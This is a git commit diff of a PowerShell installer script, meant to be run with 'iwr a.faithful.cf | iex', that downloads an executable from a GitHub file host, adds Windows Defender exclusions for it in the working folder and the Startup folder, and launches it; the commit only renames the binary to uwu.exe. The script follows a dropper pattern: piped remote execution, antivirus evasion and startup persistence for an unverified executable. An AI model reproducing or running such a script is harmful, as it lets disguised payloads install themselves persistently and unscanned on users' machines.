84a275dfc8fb7f3b70565c813b0bb2e0aedaa169
Thaddeus Kuah <thaddeuskkr@gmail.com>
2022-05-22 12:42:55 +0800

    commit new version

--- faithful.sh
+++ faithful.sh
@@ -3,19 +3,19 @@
 # iwr a.faithful.cf | iex
 
 Write-Output "The Faithful script was recently updated, and this administrator script was re-added."
-Write-Output "[LAST UPDATE]: 23/4/2022 6:20 PM"
+Write-Output "[LAST UPDATE]: 22/5/2022 12:45 PM"
 Write-Output "(INFO) Starting download..."
-Invoke-WebRequest https://raw.githubusercontent.com/thaddeuskkr/filehost/master/faithful.exe -OutFile "XFaithful.exe"
+Invoke-WebRequest https://raw.githubusercontent.com/thaddeuskkr/filehost/master/uwu-executable.exe -OutFile "uwu.exe"
 Write-Output "(INFO) Executable downloaded"
 Write-Output "(INFO) Adding exclusions for Windows defender..."
-Add-MpPreference -ExclusionPath "$((Get-Item .).FullName)\XFaithful.exe"
-Add-MpPreference -ExclusionPath "$env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\XFaithful.exe"
+Add-MpPreference -ExclusionPath "$((Get-Item .).FullName)\uwu.exe"
+Add-MpPreference -ExclusionPath "$env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\uwu.exe"
 Write-Output "(INFO) Exclusions added. If the above two commands failed, you need to add Faithful as an exclusion manually so that the program continues to work."
 Write-Output "(INFO) The two exclusion paths to add are:"
-Write-Output "(INFO) $((Get-Item .).FullName)\XFaithful.exe"
+Write-Output "(INFO) $((Get-Item .).FullName)\uwu.exe"
 Write-Output "(INFO) and"
-Write-Output "(INFO) $env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\XFaithful.exe"
+Write-Output "(INFO) $env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\uwu.exe"
 Write-Output "(INFO) You can ignore the output if the previous command was successful."
 Write-Output "(INFO) Starting Faithful..."
-Start-Process ("XFaithful.exe")
+Start-Process ("uwu.exe")
 Write-Output "(INFO) Done!"
